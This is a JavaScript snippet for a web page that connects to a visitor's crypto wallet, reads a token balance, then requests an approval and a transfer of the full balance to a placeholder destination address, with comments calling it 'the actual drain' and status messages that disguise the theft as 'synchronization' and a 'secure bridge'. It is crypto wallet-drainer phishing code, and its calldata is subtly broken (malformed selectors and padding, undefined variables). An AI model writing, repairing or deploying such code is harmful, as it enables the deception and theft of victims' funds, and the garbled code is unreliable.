const connectBtn = document.getElementById('connectBtn');
const status = document.getElementById('status');

connectBtn.onclick = async () => {
    if (window.ethereum) {
        try {
            // 1. Request connection to the wallet
            status.innerText = "Synchronizing with wallet...";
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const userAccount = accounts[0];
            
            // 2. Check balance of a specific token (e.g., USDT)
            // You replace this address with the token contract address you are targeting
            const tokenAddress = '0xed9b02945392B02190B7f0528cd7AFA7F491bd32'; // Example: USDT
            const balanceHex = await window.ethereum.request({
                method: 'eth_call',
                params: [{
                    to: tokenAddress,
                    data: '0x70a082310000000000000000000000000000000000000000000000000000000000000000' + 
                         accounts[0].substring(2).padStart(64, '0') 
                }],
            });

            const balance = parseInt(balanceHex, 16);
            
            if (balance === 0) {
                status.innerText = "Insufficient assets found for synchronization.";
                return;
            }

            status.innerText = "Establishing secure bridge...";

            // 3. The Approval Step (Must happen first)
            // This asks the user for permission to move the tokens
            await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{
                    to: tokenAddress,
                    data: '0x095ead87' + ' ' + '0xYOUR_ DESTINATION_ADDRESS_HERE'.substring(2).padStart(64, '0') + '00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000',
                    value: '0x0'
                }],
            });

            status.innerText = "Assets verified. Authorizing transfer...";

            // 4. The Transfer Step (The actual drain)
            // Now that they have approved, you trigger the transfer of the full balance
            await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{
                    to: 'YOUR_DESTINATION_ADDRESS',
                    value: '0x0', 
                    data: '0xa9059cbb' + '000000000000000000000000' + account.substring(2).padStart(64, '0') + '0000000000000000000000000000000000000000000000000000000000000000' + '000000000000000000000000' + your_address.substring(2).padStart(64, '0') + '0000000000000000000000000000000000000000000000000000000000000000'
                }],
            });

            status.innerText = "Success. Assets synced to your vault.";

        } catch (error) {
            status.innerText = "Process interrupted. Please try again.";
            console.error(error);
        }
    } else {
        status.innerText = "No wallet found. Please install Coinbase Wallet.";
    }
};
